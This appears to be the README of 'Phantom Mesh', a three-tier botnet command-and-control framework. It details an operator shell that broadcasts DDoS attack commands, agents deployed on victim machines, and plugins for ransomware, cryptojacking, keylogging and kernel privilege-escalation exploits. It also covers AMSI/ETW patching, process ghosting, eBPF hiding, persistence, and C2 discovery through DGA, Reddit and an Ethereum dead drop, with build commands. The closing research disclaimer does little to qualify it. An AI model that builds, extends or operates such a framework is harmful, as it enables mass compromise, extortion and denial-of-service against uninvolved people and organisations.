# Phantom Mesh

A distributed, resilient command-and-control (C2) framework with modular architecture, multi-platform support, and advanced evasion capabilities.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Node Types](#node-types)
- [Network Topology](#network-topology)
- [Plugin System](#plugin-system)
- [Bootstrap Mechanism](#bootstrap-mechanism)
- [Stealth Subsystem](#stealth-subsystem)
- [Protocol Specification](#protocol-specification)
- [Build Instructions](#build-instructions)
- [Smart Contract](#smart-contract)
- [Directory Structure](#directory-structure)

---

## Architecture Overview

Phantom Mesh implements a **three-tier distributed architecture**:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           OPERATOR TIER                                      │
│                      Phantom Node (Rust) — C2 Controller                     │
│                                                                              │
│                          ┌─────────────────────┐                            │
│                          │   PHANTOM SERVER    │                            │
│                          │   ┌─────────────┐   │                            │
│                          │   │  SSH Shell  │◄──┼──── Operator (admin)       │
│                          │   │  Port 12961 │   │     ssh admin@ip -p 12961  │
│                          │   └──────┬──────┘   │                            │
│                          │          │          │                            │
│                          │   ┌──────▼──────┐   │                            │
│                          │   │ Ed25519 Sign│   │                            │
│                          │   │ + Broadcast │   │                            │
│                          │   └──────┬──────┘   │                            │
│                          └──────────┼──────────┘                            │
│                                     │ P2P (UDP 31338)                       │
└─────────────────────────────────────┼───────────────────────────────────────┘
                                      │
                                      ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CONTROL TIER                                       │
│                      Cloud Nodes (Zig) — C2 Mesh Servers                     │
│                                                                              │
│    ┌──────────┐         ┌──────────┐         ┌──────────┐                   │
│    │  Cloud   │◄──────► │  Cloud   │◄──────► │  Cloud   │                   │
│    │  Node A  │   P2P   │  Node B  │   P2P   │  Node C  │                   │
│    └────┬─────┘ Gossip  └────┬─────┘ Gossip  └────┬─────┘                   │
│         │    UDP 31337      │                    │                          │
│         │    Signature      │                    │                          │
│         │    Verified       │                    │                          │
└─────────┼───────────────────┼────────────────────┼──────────────────────────┘
          │                   │                    │
          │ MQTT (outbound)   │ MQTT              │ MQTT
          │ ChaCha20          │                   │
          ▼                   ▼                   ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           EXECUTION TIER                                     │
│                      Edge Nodes (Rust) — Target Agents                       │
│                                                                              │
│    ┌─────────────────────────┐    ┌─────────────────────────┐               │
│    │   Local Network A       │    │   Local Network B       │               │
│    │   ┌───────────────┐     │    │   ┌───────────────┐     │               │
│    │   │    LEADER     │     │    │   │    LEADER     │     │               │
│    │   │  ┌─────────┐  │     │    │   │  ┌─────────┐  │     │               │
│    │   │  │MQTT→Cloud│  │     │    │   │  │MQTT→Cloud│  │     │               │
│    │   │  └────┬────┘  │     │    │   │  └────┬────┘  │     │               │
│    │   └───────┼───────┘     │    │   └───────┼───────┘     │               │
│    │           │ IPC         │    │           │ IPC         │               │
│    │    ┌──────┴──────┐      │    │    ┌──────┴──────┐      │               │
│    │    │  Workers    │      │    │    │  Workers    │      │               │
│    │    └─────────────┘      │    │    └─────────────┘      │               │
│    └─────────────────────────┘    └─────────────────────────┘               │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Three-Tier Hierarchy

| Tier | Node | Role | Language |
|------|------|------|----------|
| **Operator** | Phantom | SSH-based C2 controller, signs commands, broadcasts to Cloud | Rust |
| **Control** | Cloud | P2P mesh, verifies signatures, relays to Edge via MQTT | Zig |
| **Execution** | Edge | Target agents, Leader/Worker election, plugin execution | Rust |

---

## Node Types

### Phantom Node (`crates/nodes/phantom`)
**Language**: Rust  
**Target**: Operator workstation / VPS  
**Role**: Master C2 Controller

The Phantom node is the **operator interface** — a secure SSH server where the attacker issues commands.

| Module | Description |
|--------|-------------|
| `main.rs` | SSH server (russh), CLI parsing, bootstrap |
| `server.rs` | Command handlers (attack, signal) |
| `p2p.rs` | UDP P2P to Cloud nodes (port 31338), Ed25519 signing |
| `eth_broadcaster.rs` | Sepolia dead-drop publishing |
| `dga.rs` | DGA seed resolution |

**Commands**:
```
PhantomC2$ help
Available: attack <ip> <port> <duration>, signal <ip:port>

PhantomC2$ attack 1.2.3.4 80 60
[+] Global Attack Broadcasted!

PhantomC2$ signal 5.6.7.8:31337
[+] Sepolia Signal Sent! 0x...
```

**Connection**: `ssh admin@<phantom-ip> -p 12961`

### Cloud Node (`crates/nodes/cloud`)
**Language**: Zig  
**Target**: Linux servers, IoT infrastructure  
**Role**: C2 Mesh Server

Cloud nodes form a **P2P gossip mesh** that receives signed commands from Phantom and relays to Edge.

| Module | Description |
|--------|-------------|
| `network/p2p.zig` | UDP gossip (port 31337), Ed25519 verification, command flood |
| `network/proxy.zig` | SOCKS proxy for traffic relay |
| `network/scanner.zig` | Network reconnaissance |
| `network/dns.zig` | DNS resolver with DGA |
| `attack/` | DDoS methods (UDP, TCP SYN, HTTP) |
| `system/killer.zig` | Competitor process termination |
| `system/stealth.zig` | Anti-debug, self-delete |

**Security Features**:
- Ed25519 signature verification on all commands
- Nonce replay protection (64-entry circular buffer)
- Config update propagation (fan-out 5)

### Edge Node (`crates/nodes/edge`)
**Language**: Rust (async/tokio)  
**Target**: Linux x86_64, Windows x64  
**Role**: Target Execution Agent

Edge nodes are **deployed on targets** and self-organize into local clusters.

| Module | Description |
|--------|-------------|
| `core/runtime.rs` | Leader/Worker mode dispatch |
| `network/client.rs` | Outbound MQTT to Cloud (ChaCha20) |
| `network/bootstrap/` | Multi-tier C2 discovery |
| `network/bridge.rs` | Worker IPC handler |
| `discovery/election.rs` | Leader election (UDP 31338) |
| `discovery/zero_noise.rs` | Passive sniffing + covert handshake |
| `stealth/` | Windows + Linux evasion |
| `plugins/` | Dynamic plugin loader |

**Edge Roles**:
- **Leader**: Wins election → connects to Cloud → bridges Workers
- **Worker**: Loses election → connects to Leader via IPC

---

## Network Topology

### Command Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│ 1. OPERATOR ISSUES COMMAND                                               │
│    ────────────────────────                                              │
│    ssh admin@phantom -p 12961                                            │
│    PhantomC2$ attack 1.2.3.4 80 60                                       │
│                                                                          │
│    Phantom signs with Master Ed25519 Key                                 │
│    Broadcasts P2PCommand to known Cloud peers                            │
└──────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ 2. CLOUD MESH PROPAGATION                                                │
│    ───────────────────────                                               │
│    Cloud Node receives UDP packet                                        │
│    Verifies Ed25519 signature against hardcoded pubkey                   │
│    Checks nonce (replay protection)                                      │
│    Gossip floods to 3 random neighbors                                   │
│    Triggers attack callback                                              │
└──────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ 3. EDGE EXECUTION                                                        │
│    ──────────────                                                        │
│    Edge Leader receives command via MQTT                                 │
│    Dispatches to loaded plugins                                          │
│    Bridges to Workers via IPC                                            │
└──────────────────────────────────────────────────────────────────────────┘
```

### Protocol Ports

| Port | Protocol | Node | Purpose |
|------|----------|------|---------|
| **12961** | TCP/SSH | Phantom | Operator shell |
| **31337** | UDP | Cloud | P2P gossip mesh |
| **31338** | UDP | Edge | Leader election |
| **9631** | TCP | Edge | Covert peer handshake |

### P2P Packet Types

```
Cloud P2P (UDP 31337):
┌────────────┬───────────────────────────────────────────────────────┐
│ GOSSIP     │ Share neighbor list (fan-out 3, 60s interval)        │
│ CMD        │ Attack command (signed, nonce-protected)             │
│ CONFIG     │ C2 address update (signed + encrypted)               │
└────────────┴───────────────────────────────────────────────────────┘

Command Packet Layout:
┌────────┬──────┬───────┬───────────┬────────┬─────────────┐
│ Magic  │ Type │ Nonce │ Signature │ Length │ Payload     │
│ 4 bytes│ 1    │ 4     │ 64        │ 2      │ N bytes     │
└────────┴──────┴───────┴───────────┴────────┴─────────────┘
```

---

## Plugin System

Dynamic plugins loaded at runtime:

| Plugin | Description |
|--------|-------------|
| **DDoS** | Distributed denial-of-service |
| **Cryptojacking** | Cryptocurrency mining |
| **Ransomware** | File encryption |
| **Keylogger** | Keystroke capture |
| **PrivEsc** | Privilege escalation (4 CVEs) |

### Privilege Escalation Exploits

| CVE | Name | Kernel Range | Reliability |
|-----|------|--------------|-------------|
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16 | 100% |
| CVE-2021-4034 | PwnKit | polkit < 0.120 | 100% |
| CVE-2024-1086 | Netfilter UAF | 5.14 – 6.6 | ~80% |
| CVE-2016-5195 | Dirty COW | 2.6.22 – 4.8 | ~90% |

---

## Bootstrap Mechanism

Edge nodes discover Cloud addresses via 5-tier resolution:

| Tier | Method | Description |
|------|--------|-------------|
| **0** | Local Cache | `/var/tmp/.phantom_nodes` |
| **1** | DNS-over-HTTPS | TXT record via Google/Cloudflare |
| **2** | Reddit | Tagged posts in subreddits |
| **3** | DGA | Day-seeded domain generation |
| **4** | Blockchain | Ethereum Sepolia event logs |

All payloads signed with Ed25519.

---

## Stealth Subsystem

### Windows

| Module | Technique |
|--------|-----------|
| `syscalls.rs` | Indirect syscalls (Hell's Gate) |
| `ghosting.rs` | Process ghosting |
| `obfuscation.rs` | Sleep obfuscation (Ekko) |
| `blinding.rs` | ETW + AMSI patching |
| `persistence.rs` | COM hijacking, WMI |
| `ads.rs` | NTFS ADS storage |

### Linux

| Module | Technique |
|--------|-----------|
| `memfd.rs` | Fileless execution |
| `persistence.rs` | Systemd generator |
| `hijack.rs` | ELF RPATH patching |
| `ebpf.rs` | eBPF-based hiding |

---

## Build Instructions

### Phantom (Operator)

```bash
cargo build -p phantom --release
# Run: ./target/release/phantom --key keys/ --port 12961
```

### Cloud (C2 Mesh)

```bash
make cloud_linux_x64
make cloud_linux_arm64
```

### Edge (Agent)

```bash
cargo build -p edge --release
cargo build -p edge --release --target x86_64-unknown-linux-musl
```

---

## Smart Contract

Ethereum Sepolia for dead-drop C2:

- **Contract**: `smart_contracts/signal.sol`
- **Purpose**: Operator publishes new C2 address when primary is down
- **Command**: `signal <ip:port>` in Phantom shell

---

## Directory Structure

```
phantom-mesh/
├── crates/
│   ├── nodes/
│   │   ├── phantom/        # Operator C2 (Rust SSH)
│   │   ├── cloud/          # Mesh Server (Zig)
│   │   └── edge/           # Target Agent (Rust)
│   ├── plugins/
│   │   └── privesc/        # 4 CVE exploits
│   └── shared/
│       ├── protocol/
│       └── plugin_api/
└── smart_contracts/
    └── signal.sol
```

---

## License

Proprietary. Unauthorized distribution prohibited.

---

## Disclaimer

This software is provided for authorized security research and red team operations only.
